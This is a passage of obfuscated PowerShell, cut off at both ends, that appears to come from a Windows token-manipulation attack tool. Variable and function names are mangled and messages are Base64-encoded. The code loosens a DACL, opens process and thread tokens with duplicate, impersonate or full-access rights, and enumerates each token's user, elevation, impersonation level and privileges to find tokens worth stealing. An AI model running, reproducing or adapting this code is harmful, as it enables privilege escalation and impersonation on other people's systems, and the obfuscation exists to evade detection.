            ${____/\____/===\_/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/=\_/\_/\_/\___})
            ${/==\____/====\_/\} = ${/=\/\/=\____/==\/}.Invoke(1, [IntPtr]::Zero, ${____/\____/===\_/}, [Ref]${__/=\_/\_/\_/\___})
            if (-not ${/==\____/====\_/\})
            {
                Throw (New-Object ComponentModel.Win32Exception)
            }
            ${/=\/\_/=====\___/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${__/\/\/\__/=\__/\})
            ${_/=\/\/=\/\/\_/=\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/\_/=====\___/})
            ${___/=\__/\_/\__/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\/\/=\/\/\_/=\}, [Type]${__/\/\/\__/=\__/\})
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/=\/\/=\/\/\_/=\})
            ${___/=\__/\_/\__/\}.pMultipleTrustee = [IntPtr]::Zero
            ${___/=\__/\_/\__/\}.MultipleTrusteeOperation = 0
            ${___/=\__/\_/\__/\}.TrusteeForm = ${__/==\/==\/\_/=\_}.TRUSTEE_IS_SID
            ${___/=\__/\_/\__/\}.TrusteeType = ${__/==\/==\/\_/=\_}.TRUSTEE_IS_WELL_KNOWN_GROUP
            ${___/=\__/\_/\__/\}.ptstrName = ${____/\____/===\_/}
            ${__/=\/\/=\/=\____} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_/=\/\/=\__/====\})
            ${_/\/\/==\_/\/===\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/=\/\/=\/=\____})
            ${____/\/=====\_/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\/==\_/\/===\}, [Type]${_/=\/\/=\__/====\})
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/\/\/==\_/\/===\})
            ${____/\/=====\_/=\}.grfAccessPermissions = 0xf03ff
            ${____/\/=====\_/=\}.grfAccessMode = ${__/==\/==\/\_/=\_}.GRANT_ACCESS
            ${____/\/=====\_/=\}.grfInheritance = ${__/==\/==\/\_/=\_}.OBJECT_INHERIT_ACE
            ${____/\/=====\_/=\}.Trustee = ${___/=\__/\_/\__/\}
            [IntPtr]${/\____/==\/=\_/\/} = [IntPtr]::Zero
            ${/====\_/==\__/\/\} = ${__/==\/\__/===\/\}.Invoke(1, [Ref]${____/\/=====\_/=\}, ${___/=\/=\/=\/\___}, [Ref]${/\____/==\/=\_/\/})
            if (${/====\_/==\__/\/\} -ne 0)
            {
                Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwBhAGwAbABpAG4AZwAgAFMAZQB0AEUAbgB0AHIAaQBlAHMASQBuAEEAYwBsAFcAOgAgACQAewAvAD0APQA9AD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAfQA=')))
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${____/\____/===\_/})
            if (${/\____/==\/=\_/\/} -eq [IntPtr]::Zero)
            {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABEAEEAQwBMACAAaQBzACAAbgB1AGwAbAA=')))
            }
            ${/====\_/==\__/\/\} = ${/==\/==\/==\/\__/}.Invoke(${__/=\/=\__/=\___/\}, 0x7, ${__/==\/==\/\_/=\_}.DACL_SECURITY_INFORMATION, ${/==\____/=\/\/=\_}, ${/==\__/\/=\/\_/\_}, ${/\____/==\/=\_/\/}, ${_/\___/=\__/\/==\})
            if (${/====\_/==\__/\/\} -ne 0)
            {
                Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUwBlAGMAdQByAGkAdAB5AEkAbgBmAG8AIABmAGEAaQBsAGUAZAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewAvAD0APQA9AD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAfQA=')))
            }
            ${_____/===\____/\/}.Invoke(${/\_____/=\/==\/\/}) | Out-Null
        }
    }
    function ___/\_/\__/==\____
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,
            [Parameter()]
            [Switch]
            ${__/\/==\___/=\_/==}
        )
        if (${__/\/==\___/=\_/==})
        {
            ${__/==\_/\___/=\_/} = ${__/==\/==\/\_/=\_}.TOKEN_ALL_ACCESS
        }
        else
        {
            ${__/==\_/\___/=\_/} = ${__/==\/==\/\_/=\_}.TOKEN_ASSIGN_PRIMARY -bor ${__/==\/==\/\_/=\_}.TOKEN_DUPLICATE -bor ${__/==\/==\/\_/=\_}.TOKEN_IMPERSONATE -bor ${__/==\/==\/\_/=\_}.TOKEN_QUERY 
        }
        ${_/===\/=\_/\/\/\_} = New-Object PSObject
        ${/=\_/\/\____/==\_} = ${_/=\___/=\/=\___/}.Invoke(${__/==\/==\/\_/=\_}.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        ${_/===\/=\_/\/\/\_} | Add-Member -MemberType NoteProperty -Name hProcess -Value ${/=\_/\/\____/==\_}
        if (${/=\_/\/\____/==\_} -eq [IntPtr]::Zero)
        {
            ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((ps -Id $ProcessId).Name). Error code: ${/\____/\_____/=\_} . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]${/\____/=\/=\_/\__} = [IntPtr]::Zero
            ${/==\____/====\_/\} = ${___/=\_/=\/=\_/==}.Invoke(${/=\_/\/\____/==\_}, ${__/==\_/\___/=\_/}, [Ref]${/\____/=\/=\_/\__})
            if (-not ${/==\_/\/==\/==\__}.Invoke(${/=\_/\/\____/==\_}))
            {
                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABwAHIAbwBjAGUAcwBzACAAaABhAG4AZABsAGUALAAgAHQAaABpAHMAIABpAHMAIAB1AG4AZQB4AHAAZQBjAHQAZQBkAC4AIABFAHIAcgBvAHIAQwBvAGQAZQA6ACAAJAB7AC8AXABfAF8AXwBfAC8AXABfAF8AXwBfAF8ALwA9AFwAXwB9AA==')))
            }
            ${/=\_/\/\____/==\_} = [IntPtr]::Zero
            if (${/==\____/====\_/\} -eq $false -or ${/\____/=\/=\_/\__} -eq [IntPtr]::Zero)
            {
                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((ps -Id $ProcessId).Name). Error: ${/\____/\_____/=\_}"
                return $null
            }
            else
            {
                ${_/===\/=\_/\/\/\_} | Add-Member -MemberType NoteProperty -Name hProcToken -Value ${/\____/=\/=\_/\__}
            }
        }
        return ${_/===\/=\_/\/\/\_}
    }
    function __/\/==\/====\____
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ThreadId
        )
        ${__/==\_/\___/=\_/} = ${__/==\/==\/\_/=\_}.TOKEN_ALL_ACCESS
        ${__/\_/\_/\_/\/\_/} = New-Object PSObject
        [IntPtr]${/===\/=\/==\_/\__} = [IntPtr]::Zero
        ${/=\_/\__/=\/=\/\/} = ${/\_____/\/=\_/\/\}.Invoke(${__/==\/==\/\_/=\_}.THREAD_ALL_ACCESS, $false, $ThreadId)
        if (${/=\_/\__/=\/=\/\/} -eq [IntPtr]::Zero)
        {
            ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if (${/\____/\_____/=\_} -ne ${__/==\/==\/\_/=\_}.ERROR_INVALID_PARAMETER) 
            {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABvAHAAZQBuACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGYAbwByACAAVABoAHIAZQBhAGQASQBkADoAIAAkAFQAaAByAGUAYQBkAEkAZAAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AC8AXABfAF8AXwBfAC8AXABfAF8AXwBfAF8ALwA9AFwAXwB9AA==')))
            }
        }
        else
        {
            ${/==\____/====\_/\} = ${/==\_/\_/\__/\__/}.Invoke(${/=\_/\__/=\/=\/\/}, ${__/==\_/\___/=\_/}, $false, [Ref]${/===\/=\/==\_/\__})
            if (-not ${/==\____/====\_/\})
            {
                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ((${/\____/\_____/=\_} -ne ${__/==\/==\/\_/=\_}.ERROR_NO_TOKEN) -and  
                 (${/\____/\_____/=\_} -ne ${__/==\/==\/\_/=\_}.ERROR_INVALID_PARAMETER)) 
                {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGEAbABsACAATwBwAGUAbgBUAGgAcgBlAGEAZABUAG8AawBlAG4AIABmAG8AcgAgAFQAaAByAGUAYQBkAEkAZAA6ACAAJABUAGgAcgBlAGEAZABJAGQALgAgAEUAcgByAG8AcgAgAGMAbwBkAGUAOgAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAF8AXwBfAC8APQBcAF8AfQA=')))
                }
            }
            else
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABxAHUAZQByAGkAZQBkACAAdABoAHIAZQBhAGQAIAB0AG8AawBlAG4A')))
            }
            if (-not ${/==\_/\/==\/==\__}.Invoke(${/=\_/\__/=\/=\/\/}))
            {
                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIAB0AGgAcgBlAGEAZAAgAGgAYQBuAGQAbABlACwAIAB0AGgAaQBzACAAaQBzACAAdQBuAGUAeABwAGUAYwB0AGUAZAAuACAARQByAHIAbwByAEMAbwBkAGUAOgAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAF8AXwBfAC8APQBcAF8AfQA=')))
            }
            ${/=\_/\__/=\/=\/\/} = [IntPtr]::Zero
        }
        ${__/\_/\_/\_/\/\_/} | Add-Member -MemberType NoteProperty -Name hThreadToken -Value ${/===\/=\/==\_/\__}
        return ${__/\_/\_/\_/\/\_/}
    }
    function __/===\/\/=\/\/===
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            ${__/===\/\_________}
        )
        ${_/\_______/======} = $null
        ${_/==\/=\___/\/=\/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_/=\/\___/=\/\/\/})
        [IntPtr]${/=\/\__/=\_/\_/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/==\/=\___/\/=\/})
        [UInt32]${__/=\_/\_/\_/\___} = 0
        ${/==\____/====\_/\} = ${___/\____/==\____}.Invoke(${__/===\/\_________}, ${___/\/====\_/\_/=}::TokenStatistics, ${/=\/\__/=\_/\_/==}, ${_/==\/=\___/\/=\/}, [Ref]${__/=\_/\_/\_/\___})
        if (-not ${/==\____/====\_/\})
        {
            ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAIABjAG8AZABlADoAIAAkAHsALwBcAF8AXwBfAF8ALwBcAF8AXwBfAF8AXwAvAD0AXABfAH0A')))
        }
        else
        {
            ${_/==\/\/=======\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/\__/=\_/\_/==}, [Type]${_/=\/\___/=\/\/\/})
            ${/=\/\/\/=\_/\/=\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${/==\____/=\__/\__}))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\/\/=======\_}.AuthenticationId, ${/=\/\/\/=\_/\/=\/}, $false)
            [IntPtr]${/==\_/\/==\/\/\__} = [IntPtr]::Zero
            ${_/\/=\/\/\_____/\} = ${/=\_/\_/==\_____/}.Invoke(${/=\/\/\/=\_/\/=\/}, [Ref]${/==\_/\/==\/\/\__})
            if (${_/\/=\/\/\_____/\} -ne 0 -and ${/==\_/\/==\/\/\__} -eq [IntPtr]::Zero)
            {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEwAcwBhAEcAZQB0AEwAbwBnAG8AbgBTAGUAcwBzAGkAbwBuAEQAYQB0AGEAIABmAGEAaQBsAGUAZAAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AF8ALwBcAC8APQBcAC8AXAAvAFwAXwBfAF8AXwBfAC8AXAB9AC4AIABMAG8AZwBvAG4AUwBlAHMAcwBpAG8AbgBEAGEAdABhAFAAdAByACAAPQAgACQAewAvAD0APQBcAF8ALwBcAC8APQA9AFwALwBcAC8AXABfAF8AfQA=')))
            }
            else
            {
                ${/=\_/\_/=\__/\/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\_/\/==\/\/\__}, [Type]${___/==\__/\_/=\/\})
                if (${/=\_/\_/=\__/\/=\}.Username.Buffer -ne [IntPtr]::Zero -and 
                    ${/=\_/\_/=\__/\/=\}.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/=\_/\_/=\__/\/=\}.Username.Buffer, ${/=\_/\_/=\__/\/=\}.Username.Length/2)
                    ${___/=\__/\_/==\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/=\_/\_/=\__/\/=\}.LoginDomain.Buffer, ${/=\_/\_/=\__/\/=\}.LoginDomain.Length/2)
                    if ($Username -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]${____/=\/\_/====\/} = 100
                        [UInt32]${_/\/===\___/\/=\/} = ${____/=\/\_/====\/} / 2
                        [UInt32]${_/=\/===\/=====\/} = ${____/=\/\_/====\/} / 2
                        [UInt32]${_/\___/==\___/\/\} = 0
                        ${/==\/=\_____/\_/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${____/=\/\_/====\/})
                        ${/=\/\_/=====\_/=\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${____/=\/\_/====\/})
                        ${/==\____/====\_/\} = ${/=\_/=\/=\___/\/\}.Invoke([IntPtr]::Zero, ${/=\_/\_/=\__/\/=\}.Sid, ${/==\/=\_____/\_/\}, [Ref]${_/\/===\___/\/=\/}, ${/=\/\_/=====\_/=\}, [Ref]${_/=\/===\/=====\/}, [Ref]${_/\___/==\___/\/\})
                        if (${/==\____/====\_/\})
                        {
                            $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/==\/=\_____/\_/\})
                            ${___/=\__/\_/==\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/=\/\_/=====\_/=\})
                        }
                        else
                        {
                            ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwBhAGwAbABpAG4AZwAgAEwAbwBvAGsAdQBwAEEAYwBjAG8AdQBuAHQAUwBpAGQAVwAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AC8AXABfAF8AXwBfAC8AXABfAF8AXwBfAF8ALwA9AFwAXwB9AA==')))
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/==\/=\_____/\_/\})
                        ${/==\/=\_____/\_/\} = [IntPtr]::Zero
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/=\/\_/=====\_/=\})
                        ${/=\/\_/=====\_/=\} = [IntPtr]::Zero
                    }
                    ${_/\_______/======} = New-Object PSObject
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name Domain -Value ${___/=\__/\_/==\_/}
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name Username -Value $Username    
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name hToken -Value ${__/===\/\_________}
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name LogonType -Value ${/=\_/\_/=\__/\/=\}.LogonType
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name IsElevated -Value $false
                    ${__/=\_/\/\/\_/\/=} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${/=\/==\__/\_/=\/=})
                    ${/==\__/=====\/\/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/=\_/\/\/\_/\/=})
                    [UInt32]${__/=\_/\_/\_/\___} = 0
                    ${/==\____/====\_/\} = ${___/\____/==\____}.Invoke(${__/===\/\_________}, ${___/\/====\_/\_/=}::TokenElevation, ${/==\__/=====\/\/\}, ${__/=\_/\/\/\_/\/=}, [Ref]${__/=\_/\_/\_/\___})
                    if (-not ${/==\____/====\_/\})
                    {
                        ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuAEUAbABlAHYAYQB0AGkAbwBuACAAcwB0AGEAdAB1AHMALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsALwBcAF8AXwBfAF8ALwBcAF8AXwBfAF8AXwAvAD0AXABfAH0A'))) 
                    }
                    else
                    {
                        ${/==\/\/=\_/==\_/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\__/=====\/\/\}, [Type]${/=\/==\__/\_/=\/=})
                        if (${/==\/\/=\_/==\_/=}.TokenIsElevated -ne 0)
                        {
                            ${_/\_______/======}.IsElevated = $true
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/==\__/=====\/\/\})
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name TokenType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAVABvAFIAZQB0AHIAaQBlAHYAZQA=')))
                    [UInt32]${/==\___/==\___/\/} = 4
                    [IntPtr]${/\_____/===\/===\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/==\___/==\___/\/})
                    [UInt32]${__/=\_/\_/\_/\___} = 0
                    ${/==\____/====\_/\} = ${___/\____/==\____}.Invoke(${__/===\/\_________}, ${___/\/====\_/\_/=}::TokenType, ${/\_____/===\/===\}, ${/==\___/==\___/\/}, [Ref]${__/=\_/\_/\_/\___})
                    if (-not ${/==\____/====\_/\})
                    {
                        ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsACAAcwB0AGEAdAB1AHMALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsALwBcAF8AXwBfAF8ALwBcAF8AXwBfAF8AXwAvAD0AXABfAH0A')))
                    }
                    else
                    {
                        [UInt32]${__/=\/=\_/==\_/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/\_____/===\/===\}, [Type][UInt32])
                        switch(${__/=\/=\_/==\_/==})
                        {
                            1 {${_/\_______/======}.TokenType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbQBhAHIAeQA=')))}
                            2 {${_/\_______/======}.TokenType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA=')))}
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/\_____/===\/===\})
                    if (${_/\_______/======}.TokenType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA='))))
                    {
                        ${_/\_______/======} | Add-Member -Type NoteProperty -Name ImpersonationLevel -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAVABvAFIAZQB0AHIAaQBlAHYAZQA=')))
                        [UInt32]${__/==\_/===\___/=} = 4
                        [IntPtr]${__/=\__/\/\_/\/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/==\_/===\___/=}) 
                        [UInt32]${__/=\_/\_/\_/\___} = 0
                        ${/==\____/====\_/\} = ${___/\____/==\____}.Invoke(${__/===\/\_________}, ${___/\/====\_/\_/=}::TokenImpersonationLevel, ${__/=\__/\/\_/\/\/}, ${__/==\_/===\___/=}, [Ref]${__/=\_/\_/\_/\___})
                        if (-not ${/==\____/====\_/\})
                        {
                            ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsACAAcwB0AGEAdAB1AHMALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsALwBcAF8AXwBfAF8ALwBcAF8AXwBfAF8AXwAvAD0AXABfAH0A')))
                        }
                        else
                        {
                            [UInt32]${___/\/\_/==\/==\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\__/\/\_/\/\/}, [Type][UInt32])
                            switch (${___/\/\_/==\/==\_})
                            {
                                0 { ${_/\_______/======}.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEEAbgBvAG4AeQBtAG8AdQBzAA=='))) }
                                1 { ${_/\_______/======}.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBjAGEAdABpAG8AbgA='))) }
                                2 { ${_/\_______/======}.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4A'))) }
                                3 { ${_/\_______/======}.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEQAZQBsAGUAZwBhAHQAaQBvAG4A'))) }
                            }
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/=\__/\/\_/\/\/})
                    }
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name SessionID -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
                    [UInt32]${_/==\___/==\/=\/\} = 4
                    [IntPtr]${_/=\_____/\/===\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/==\___/==\/=\/\})
                    [UInt32]${__/=\_/\_/\_/\___} = 0
                    ${/==\____/====\_/\} = ${___/\____/==\____}.Invoke(${__/===\/\_________}, ${___/\/====\_/\_/=}::TokenSessionId, ${_/=\_____/\/===\_}, ${_/==\___/==\/=\/\}, [Ref]${__/=\_/\_/\_/\___})
                    if (-not ${/==\____/====\_/\})
                    {
                        ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuACAAUwBlAHMAcwBpAG8AbgBJAGQALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsALwBcAF8AXwBfAF8ALwBcAF8AXwBfAF8AXwAvAD0AXABfAH0A')))
                    }
                    else
                    {
                        [UInt32]${__/==\/\__/====\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\_____/\/===\_}, [Type][UInt32])
                        ${_/\_______/======}.SessionID = ${__/==\/\__/====\/}
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/=\_____/\/===\_})
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name PrivilegesEnabled -Value @()
                    ${_/\_______/======} | Add-Member -Type NoteProperty -Name PrivilegesAvailable -Value @()
                    [UInt32]${_/===\/\/\_/\__/=} = 1000
                    [IntPtr]${_____/\/\/\/=====} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/===\/\/\_/\__/=})
                    [UInt32]${__/=\_/\_/\_/\___} = 0
                    ${/==\____/====\_/\} = ${___/\____/==\____}.Invoke(${__/===\/\_________}, ${___/\/====\_/\_/=}::TokenPrivileges, ${_____/\/\/\/=====}, ${_/===\/\/\_/\__/=}, [Ref]${__/=\_/\_/\_/\___})
                    if (-not ${/==\____/====\_/\})
                    {
                        ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuACAAUwBlAHMAcwBpAG8AbgBJAGQALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsALwBcAF8AXwBfAF8ALwBcAF8AXwBfAF8AXwAvAD0AXABfAH0A')))
                    }
                    else
                    {
                        ${____/\/\/\/\/=\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_____/\/\/\/=====}, [Type]${/===\___/\/===\/=})
                        [IntPtr]${_/\/\__/\/=\_/=\/} = [IntPtr](_/==\/=\/\/\/=\__/ ${_____/\/\/\/=====} ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]${/===\___/\/===\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))))))
                        ${/==\_/=\_/\_/=\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${___/==\_/=\_/====})
                        for (${___/===\__/\_/\/\} = 0; ${___/===\__/\_/\/\} -lt ${____/\/\/\/\/=\_/}.PrivilegeCount; ${___/===\__/\_/\/\}++)
                        {
                            ${/==\_/\_____/==\/} = [IntPtr](_/==\/=\/\/\/=\__/ ${_/\/\__/\/=\_/=\/} (${/==\_/=\_/\_/=\_/} * ${___/===\__/\_/\/\}))
                            ${/=\___/\/\/===\/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\_/\_____/==\/}, [Type]${___/==\_/=\_/====})
                            [UInt32]${______/=\/\_/\_/=} = 60
                            ${/=\___/==\_/\____} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${______/=\/\_/\_/=})
                            ${/=\/\_______/====} = ${/==\_/\_____/==\/} 
                            ${/==\____/====\_/\} = ${/=\_/=\_/\__/====}.Invoke([IntPtr]::Zero, ${/=\/\_______/====}, ${/=\___/==\_/\____}, [Ref]${______/=\/\_/\_/=})
                            if (-not ${/==\____/====\_/\})
                            {
                                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEwAbwBvAGsAdQBwAFAAcgBpAHYAaQBsAGUAZwBlAE4AYQBtAGUAVwAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAIABjAG8AZABlADoAIAAkAHsALwBcAF8AXwBfAF8ALwBcAF8AXwBfAF8AXwAvAD0AXABfAH0ALgAgAFIAZQBhAGwAUwBpAHoAZQA6ACAAJAB7AF8AXwBfAF8AXwBfAC8APQBcAC8AXABfAC8AXABfAC8APQB9AA==')))
                            }
                            ${/=\/\_____/\/\__/} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/=\___/==\_/\____})
